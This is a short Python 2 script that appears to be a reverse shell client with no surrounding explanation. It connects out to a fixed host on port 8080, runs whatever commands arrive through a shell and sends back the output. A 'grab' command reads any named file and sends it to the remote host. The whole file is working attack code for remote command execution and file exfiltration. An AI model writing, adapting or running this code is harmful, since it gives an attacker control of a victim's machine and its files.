import socket,subprocess,os

def transfer(con,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while packet != '':
            con.send(packet)
            packet = f.read(1024)
        con.send('done')
        f.close()
    else:
        con.send("error")

def connect():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.110.143.18",8080))

    while True:
    
        command = s.recv(1024)
        if 'terminate' in command:
            s.close()
            break

        elif 'grab' in command:
            grab, path = command.split('*')
            try:
                transfer(s,path)
            except Exception,e:
                s.send(str(e))
                pass
        else:
            cmd = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE)
            print command
            s.send(cmd.stdout.read())


def main():
    connect()
main()
